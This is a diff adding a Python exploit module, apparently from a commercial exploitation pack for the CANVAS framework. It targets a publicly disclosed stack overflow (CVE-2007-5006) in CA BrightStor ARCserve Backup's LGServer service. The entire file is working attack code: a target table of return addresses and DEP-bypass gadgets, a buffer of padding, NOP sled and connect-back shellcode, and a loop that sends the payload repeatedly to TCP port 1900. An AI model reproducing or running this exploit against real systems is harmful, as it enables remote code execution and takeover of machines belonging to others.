@@ -1,0 +1,197 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007
+#
+
+
+import sys
+import random
+
+if "." not in sys.path:
+    sys.path.append(".")
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+
+import struct
+import canvasengine
+
+# GUI info
+NAME = "CA BrightStor ARCserve Backup for Laptops & Desktops r11.5 LGServer Stack Overflow"
+
+DESCRIPTION = "Stack overflow vulnerability in CA BrightStor ARCserve BLD r11.5 LGServer"
+DOCUMENTATION = {}
+DOCUMENTATION["Date public"] = "2007.09.20"
+DOCUMENTATION["References"] = "http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=599"
+DOCUMENTATION["Versions Affected"] = "CA BrightStor ARCserver BLD r11.5"
+DOCUMENTATION["CVE Name"] = "CVE-2007-5006"
+DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-5006"
+DOCUMENTATION["Notes"]= """
+Your host time must be synchronized with the target host. The [range] parameter 
+is the possible difference of time in second between your host and the target host.
+The [tries] parameter is the number of tries to exploit the vulnerability.
+"""
+
+VERSION = "1.0"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Exploit"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Windows"] ]
+PROPERTY['VERSION'] = [ "2000", "2003" ]
+
+NOTES = """
+"""
+
+CHANGELOG = """
+"""
+
+targets = {    
+    0: ['Windows 2000 SP0-SP4 / Windows 2003 SP0',  0x7c2079ef],  # jmp esp @ MFC71.DLL 
+    1: ['Windows 2003 SP1 English (DEP)', 0x7c83e413], # anti-dep 
+    2: ['Windows 2003 SP1 French (DEP)',  0x7c95e413], # anti-dep  
+    3: ['Windows 2003 SP2 English (DEP)', 0x7c83f517], # anti-dep 
+    4: ['Windows 2003 SP2 French (DEP)',  0x7c95f517], # anti-dep  
+}  
+
+class theexploit(tcpexploit):
+    def __init__(self):
+        tcpexploit.__init__(self)
+        
+        self.port = 1900
+        self.host = ""                                
+        self.name = NAME   
+        self.badstring = "\x00"    
+        self.range1 = 5
+        self.tries = 50 
+        return
+        
+    def neededListenerTypes(self):
+				return [canvasengine.WIN32MOSDEF]
+				
+    def createShellcode(self):
+				return self.createSmallWin32Shellcode(self.callback.ip, self.callback.port, subesp = 1000)
+				
+    def test(self):        
+        self.host = self.target.interface
+        self.port = int(self.argsDict.get("port", self.port))
+                
+        s = self.gettcpsock()        
+        
+        try:
+            s.connect((self.host, self.port))
+        except:
+            self.log("No connection could be established")
+            return 0        
+        
+        return 1
+    
+    def run(self):	    		
+        self.host = self.target.interface
+        self.port = int(self.argsDict.get("port", self.port))        
+        self.setInfo("%s attacking %s:%d (in progress)"%(NAME, self.host, self.port))        
+        self.log("Version %d "%(self.version))     
+        self.log("Attacking %s:%d"%(self.host, self.port))
+        
+        sploitstring = self.makesploit()
+                
+        try:            
+        	for i in range(self.tries):
+						s = self.gettcpsock()
+						s.connect((self.host, self.port))
+						s.recv(1024)
+						s.sendall(sploitstring)
+        except:            
+            self.log("Attack reported no open socket - service died?")
+            self.setInfo("%s attacking %s:%d - done (failed?)"%(NAME, self.host, self.port))
+            return 0
+        
+        self.setInfo("%s attacking %s:%d - done (success!)"%(NAME, self.host, self.port))
+        
+        return 1
+        
+    def makesploit(self):
+        """
+        Construct the attack        			  
+				
+				"""        								
+				
+        if (self.version >= 1): # Windows 2003 SP1/SP2          					
+					os_name, anti_dep = targets[self.version]
+				  
+					ret = struct.pack('<L', anti_dep)
+					esp = struct.pack('<L', 0x7c2079ef)     # jmp esp @ MFC71.DLL
+					
+					pop_eax = struct.pack('<L', 0x7c153787)	# pop eax @ MFC71.DLL
+					add_eax = struct.pack('<L', 0x7c147b92) # add eax,5e5fc78b @ MFC71.DLL
+
+					add_ebp = struct.pack('<L', 0x7c1b451a) # add ebp,eax @ MFC71.DLL
+
+					
+					val1 = struct.pack('<L', 0xa19fd875) # FFFFA000 = val1 + 5e5fc78b
+					
+					mylen = "0000024784"
+					mycmd = "rxsRestoreComplete~~"
+					
+					data_1 = "A" * 19476
+					data_2 = "\x90" * 5284
+					
+					tmp = data_2[0:20]
+					tmp += self.shellcode
+					tmp += data_2[20 + len(self.shellcode):]	
+									  
+					tmp2 = tmp[0:11]
+					tmp2 += esp
+					tmp2 += tmp[15:]
+					
+					mytime = int(time.time())
+					mytime = mytime + 0x6f
+					mytime = mytime + (random.randint(-(self.range1),self.range1))
+					
+					sploitstring = "0000000010" + str(mytime) + mylen + mycmd + data_1 + pop_eax + val1 + add_eax + add_ebp + ret + tmp2
+									
+        else:                   # Windows 2000 / Windows 2003 SP0        	
+					os_name, esp = targets[self.version]
+					
+					ret = struct.pack('<L', esp)
+					
+					mylen = "0000024784"
+					mycmd = "rxsRestoreComplete~~"
+					
+					data_1 = "A" * 19476
+					data_2 = "\x90" * 5284
+					
+					mytime = int(time.time())
+					mytime = mytime + 0x6f
+					mytime = mytime + (random.randint(-(self.range1),self.range1))
+					
+					tmp = data_2[0:4]
+					tmp += self.shellcode
+					tmp += data_2[4 + len(self.shellcode):]	
+					
+					sploitstring = "0000000010" + str(mytime) + mylen + mycmd + data_1 + ret + tmp
+																							                
+        return sploitstring
+        
+    def usage(self):
+        print 'Usage: %s -v version -t host -l localIP -d localPort [-O range1:x -O tries:n'%(sys.argv[0])
+        
+        i = 0
+        
+        print 'Available versions:'
+        
+        for listline in targets.values():
+            print '\t%d: %s'%(i, listline[0])
+            i = i + 1
+        
+        sys.exit(0) 
+
+if __name__ == '__main__':
+    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION, VERSION)
+    app = theexploit()
+    ret=standard_callback_commandline(app)
+    
